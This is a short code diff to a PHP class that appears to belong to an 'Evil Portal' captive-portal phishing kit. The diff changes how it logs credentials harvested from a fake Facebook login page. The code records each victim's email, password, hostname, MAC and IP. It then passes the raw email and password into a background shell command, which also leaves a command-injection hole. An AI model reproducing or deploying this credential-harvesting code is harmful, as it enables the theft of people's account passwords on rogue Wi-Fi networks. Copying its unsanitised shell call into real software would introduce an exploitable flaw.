@@ -45,7 +45,7 @@ class MyPortal extends Portal
             $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
             $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
             $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
-            file_put_contents("$dir/evilportal-logs/facebook-login.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+            $this->writeLog("[" . date('Y-m-d H:i:s') . "Z]\n" . "login: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
             $this->execBackground("notify $email' - '$pwd");
         }
         // handle form input or other extra things there
